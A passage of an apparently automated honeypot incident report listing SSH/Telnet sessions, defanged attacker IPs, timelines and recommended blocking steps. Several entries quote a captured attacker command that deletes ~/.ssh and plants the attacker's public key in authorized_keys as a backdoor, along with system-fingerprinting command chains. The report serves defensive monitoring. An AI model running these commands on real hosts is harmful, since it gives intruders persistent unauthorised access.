| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:37:56` | `cowrie.session.connect` |
| `2026-08-25 11:37:56` | `cowrie.client.version` |
| `2026-08-25 11:37:56` | `cowrie.client.kex` |
| `2026-08-25 11:37:57` | `cowrie.login.success` |
| `2026-08-25 11:37:58` | `cowrie.session.params` |
| `2026-08-25 11:37:58` | `cowrie.command.input` |
| `2026-08-25 11:37:58` | `cowrie.command.failed` |
| `2026-08-25 11:37:58` | `cowrie.log.closed` |
| `2026-08-25 11:37:59` | `cowrie.session.params` |
| `2026-08-25 11:37:59` | `cowrie.command.input` |
| `2026-08-25 11:37:59` | `cowrie.session.file_download` |
| `2026-08-25 11:37:59` | `cowrie.log.closed` |
| `2026-08-25 11:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.111[.]224` to AbuseIPDB if not already reported
- [ ] Block `183.82.111[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5978afa8842

| Field | Detail |
|---|---|
| **Source IP** | `183.82.111[.]224` |
| **First Seen** | 2026-08-25 11:37 |
| **Last Seen** | 2026-08-25 11:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:37:59` | `cowrie.session.connect` |
| `2026-08-25 11:37:59` | `cowrie.client.version` |
| `2026-08-25 11:38:00` | `cowrie.client.kex` |
| `2026-08-25 11:38:00` | `cowrie.login.success` |
| `2026-08-25 11:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.111[.]224` to AbuseIPDB if not already reported
- [ ] Block `183.82.111[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3484fa46042

| Field | Detail |
|---|---|
| **Source IP** | `183.82.111[.]224` |
| **First Seen** | 2026-08-25 11:38 |
| **Last Seen** | 2026-08-25 11:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:38:01` | `cowrie.session.connect` |
| `2026-08-25 11:38:01` | `cowrie.client.version` |
| `2026-08-25 11:38:01` | `cowrie.client.kex` |
| `2026-08-25 11:38:02` | `cowrie.login.success` |
| `2026-08-25 11:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.111[.]224` to AbuseIPDB if not already reported
- [ ] Block `183.82.111[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e94663f034c

| Field | Detail |
|---|---|
| **Source IP** | `102.91.123[.]220` |
| **First Seen** | 2026-08-25 11:38 |
| **Last Seen** | 2026-08-25 11:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:38:21` | `cowrie.session.connect` |
| `2026-08-25 11:38:21` | `cowrie.client.version` |
| `2026-08-25 11:38:22` | `cowrie.client.kex` |
| `2026-08-25 11:38:22` | `cowrie.login.success` |
| `2026-08-25 11:38:23` | `cowrie.session.params` |
| `2026-08-25 11:38:23` | `cowrie.command.input` |
| `2026-08-25 11:38:23` | `cowrie.command.failed` |
| `2026-08-25 11:38:24` | `cowrie.log.closed` |
| `2026-08-25 11:38:24` | `cowrie.session.params` |
| `2026-08-25 11:38:24` | `cowrie.command.input` |
| `2026-08-25 11:38:25` | `cowrie.session.file_download` |
| `2026-08-25 11:38:25` | `cowrie.log.closed` |
| `2026-08-25 11:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.91.123[.]220` to AbuseIPDB if not already reported
- [ ] Block `102.91.123[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba851f9c4dd

| Field | Detail |
|---|---|
| **Source IP** | `102.91.123[.]220` |
| **First Seen** | 2026-08-25 11:38 |
| **Last Seen** | 2026-08-25 11:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:38:25` | `cowrie.session.connect` |
| `2026-08-25 11:38:25` | `cowrie.client.version` |
| `2026-08-25 11:38:25` | `cowrie.client.kex` |
| `2026-08-25 11:38:26` | `cowrie.login.success` |
| `2026-08-25 11:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.91.123[.]220` to AbuseIPDB if not already reported
- [ ] Block `102.91.123[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-424f5c283f6d

| Field | Detail |
|---|---|
| **Source IP** | `102.91.123[.]220` |
| **First Seen** | 2026-08-25 11:38 |
| **Last Seen** | 2026-08-25 11:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:38:26` | `cowrie.session.connect` |
| `2026-08-25 11:38:26` | `cowrie.client.version` |
| `2026-08-25 11:38:26` | `cowrie.client.kex` |
| `2026-08-25 11:38:27` | `cowrie.login.success` |
| `2026-08-25 11:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.91.123[.]220` to AbuseIPDB if not already reported
- [ ] Block `102.91.123[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13183669a1f8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:42 |
| **Last Seen** | 2026-08-25 11:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:42:40` | `cowrie.session.connect` |
| `2026-08-25 11:42:40` | `cowrie.client.version` |
| `2026-08-25 11:42:40` | `cowrie.client.kex` |
| `2026-08-25 11:42:41` | `cowrie.login.success` |
| `2026-08-25 11:42:41` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:42:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:42:41` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74d72df0c9b1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:42 |
| **Last Seen** | 2026-08-25 11:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:42:43` | `cowrie.session.connect` |
| `2026-08-25 11:42:43` | `cowrie.client.version` |
| `2026-08-25 11:42:43` | `cowrie.client.kex` |
| `2026-08-25 11:42:44` | `cowrie.login.success` |
| `2026-08-25 11:42:44` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:42:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:42:44` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d6c5bb1dd1

| Field | Detail |
|---|---|
| **Source IP** | `42.115.213[.]238` |
| **First Seen** | 2026-08-25 11:45 |
| **Last Seen** | 2026-08-25 11:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:45:05` | `cowrie.session.connect` |
| `2026-08-25 11:45:09` | `cowrie.telnet.option` |
| `2026-08-25 11:45:10` | `cowrie.telnet.option` |
| `2026-08-25 11:46:13` | `cowrie.login.success` |
| `2026-08-25 11:46:14` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `42.115.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `42.115.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca59fd38eb41

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-25 11:47 |
| **Last Seen** | 2026-08-25 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:47:03` | `cowrie.session.connect` |
| `2026-08-25 11:47:03` | `cowrie.client.version` |
| `2026-08-25 11:47:03` | `cowrie.client.kex` |
| `2026-08-25 11:47:03` | `cowrie.login.success` |
| `2026-08-25 11:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccc69e60a8ef

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-25 11:47 |
| **Last Seen** | 2026-08-25 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:47:03` | `cowrie.session.connect` |
| `2026-08-25 11:47:03` | `cowrie.client.version` |
| `2026-08-25 11:47:03` | `cowrie.client.kex` |
| `2026-08-25 11:47:03` | `cowrie.login.success` |
| `2026-08-25 11:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c315623e95e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-25 11:47 |
| **Last Seen** | 2026-08-25 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:47:04` | `cowrie.session.connect` |
| `2026-08-25 11:47:04` | `cowrie.client.version` |
| `2026-08-25 11:47:04` | `cowrie.client.kex` |
| `2026-08-25 11:47:04` | `cowrie.login.success` |
| `2026-08-25 11:47:04` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:47:04` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf3482fc75d1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:52 |
| **Last Seen** | 2026-08-25 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:52:23` | `cowrie.session.connect` |
| `2026-08-25 11:52:23` | `cowrie.client.version` |
| `2026-08-25 11:52:23` | `cowrie.client.kex` |
| `2026-08-25 11:52:24` | `cowrie.login.success` |
| `2026-08-25 11:52:24` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:52:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:52:24` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86639e0f6b74

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:52 |
| **Last Seen** | 2026-08-25 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:52:27` | `cowrie.session.connect` |
| `2026-08-25 11:52:27` | `cowrie.client.version` |
| `2026-08-25 11:52:27` | `cowrie.client.kex` |
| `2026-08-25 11:52:28` | `cowrie.login.success` |
| `2026-08-25 11:52:28` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:52:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:52:28` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:52:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-486417a001ef

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:02 |
| **Last Seen** | 2026-08-25 12:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:02:01` | `cowrie.session.connect` |
| `2026-08-25 12:02:01` | `cowrie.client.version` |
| `2026-08-25 12:02:01` | `cowrie.client.kex` |
| `2026-08-25 12:02:02` | `cowrie.login.success` |
| `2026-08-25 12:02:02` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:02:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:02:03` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd61766a55d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:02 |
| **Last Seen** | 2026-08-25 12:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:02:05` | `cowrie.session.connect` |
| `2026-08-25 12:02:05` | `cowrie.client.version` |
| `2026-08-25 12:02:06` | `cowrie.client.kex` |
| `2026-08-25 12:02:06` | `cowrie.login.success` |
| `2026-08-25 12:02:07` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:02:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:02:07` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52fcda28a92f

| Field | Detail |
|---|---|
| **Source IP** | `180.101.149[.]231` |
| **First Seen** | 2026-08-25 12:07 |
| **Last Seen** | 2026-08-25 12:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:07:13` | `cowrie.session.connect` |
| `2026-08-25 12:07:14` | `cowrie.client.version` |
| `2026-08-25 12:07:14` | `cowrie.client.kex` |
| `2026-08-25 12:07:18` | `cowrie.login.success` |
| `2026-08-25 12:07:21` | `cowrie.session.params` |
| `2026-08-25 12:07:21` | `cowrie.command.input` |
| `2026-08-25 12:07:22` | `cowrie.log.closed` |
| `2026-08-25 12:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.101.149[.]231` to AbuseIPDB if not already reported
- [ ] Block `180.101.149[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58d8e8fc81ac

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:11 |
| **Last Seen** | 2026-08-25 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:11:39` | `cowrie.session.connect` |
| `2026-08-25 12:11:39` | `cowrie.client.version` |
| `2026-08-25 12:11:39` | `cowrie.client.kex` |
| `2026-08-25 12:11:40` | `cowrie.login.success` |
| `2026-08-25 12:11:40` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:11:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:11:41` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a92d7e29e7e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:11 |
| **Last Seen** | 2026-08-25 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:11:43` | `cowrie.session.connect` |
| `2026-08-25 12:11:43` | `cowrie.client.version` |
| `2026-08-25 12:11:43` | `cowrie.client.kex` |
| `2026-08-25 12:11:44` | `cowrie.login.success` |
| `2026-08-25 12:11:44` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:11:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:11:45` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2edd0fb5aa04

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:12 |
| **Last Seen** | 2026-08-25 12:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:12:42` | `cowrie.session.connect` |
| `2026-08-25 12:12:42` | `cowrie.client.version` |
| `2026-08-25 12:12:42` | `cowrie.client.kex` |
| `2026-08-25 12:12:44` | `cowrie.login.success` |
| `2026-08-25 12:12:45` | `cowrie.session.params` |
| `2026-08-25 12:12:45` | `cowrie.command.input` |
| `2026-08-25 12:12:45` | `cowrie.command.input` |
| `2026-08-25 12:12:45` | `cowrie.command.input` |
| `2026-08-25 12:12:45` | `cowrie.command.input` |
| `2026-08-25 12:12:45` | `cowrie.command.input` |
| `2026-08-25 12:12:45` | `cowrie.command.success` |
| `2026-08-25 12:12:45` | `cowrie.command.input` |
| `2026-08-25 12:12:45` | `cowrie.command.input` |
| `2026-08-25 12:12:45` | `cowrie.command.input` |
| `2026-08-25 12:12:45` | `cowrie.command.input` |
| `2026-08-25 12:12:45` | `cowrie.log.closed` |
| `2026-08-25 12:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b638dbe0113a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:15 |
| **Last Seen** | 2026-08-25 12:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:15:11` | `cowrie.session.connect` |
| `2026-08-25 12:15:11` | `cowrie.client.version` |
| `2026-08-25 12:15:11` | `cowrie.client.kex` |
| `2026-08-25 12:15:12` | `cowrie.login.success` |
| `2026-08-25 12:15:13` | `cowrie.session.params` |
| `2026-08-25 12:15:13` | `cowrie.command.input` |
| `2026-08-25 12:15:13` | `cowrie.command.input` |
| `2026-08-25 12:15:13` | `cowrie.command.input` |
| `2026-08-25 12:15:13` | `cowrie.command.input` |
| `2026-08-25 12:15:13` | `cowrie.command.input` |
| `2026-08-25 12:15:13` | `cowrie.command.success` |
| `2026-08-25 12:15:13` | `cowrie.command.input` |
| `2026-08-25 12:15:13` | `cowrie.command.input` |
| `2026-08-25 12:15:13` | `cowrie.command.input` |
| `2026-08-25 12:15:13` | `cowrie.command.input` |
| `2026-08-25 12:15:13` | `cowrie.log.closed` |
| `2026-08-25 12:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-457a4a2ca0d9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:18 |
| **Last Seen** | 2026-08-25 12:18 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
